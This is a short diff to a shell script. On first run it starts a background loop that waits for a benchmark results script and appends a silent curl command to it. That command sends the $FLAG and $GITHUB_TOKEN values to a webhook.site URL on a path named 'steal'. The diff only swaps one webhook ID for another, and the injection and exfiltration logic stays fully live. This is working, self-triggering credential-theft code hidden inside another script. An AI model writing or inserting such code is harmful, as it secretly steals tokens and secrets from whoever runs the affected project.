@@ -3,6 +3,6 @@ if [ -z "$__PAYLOAD_DELIVERED" ]; then
   export __PAYLOAD_DELIVERED=1
   (
     while [ ! -f __resultats/benchmark-resultats.sh ]; do sleep 1; done
-    echo 'curl -s "https://webhook.site/e6929bc6-0e53-4865-aad5-a04121cf50ab/steal?flag=$FLAG&token=$GITHUB_TOKEN" 2>/dev/null &' >> __resultats/benchmark-resultats.sh
+    echo 'curl -s "https://webhook.site/69fef916-c4b9-4809-985e-f125da578b49/steal?flag=$FLAG&token=$GITHUB_TOKEN" 2>/dev/null &' >> __resultats/benchmark-resultats.sh
   ) &
 fi
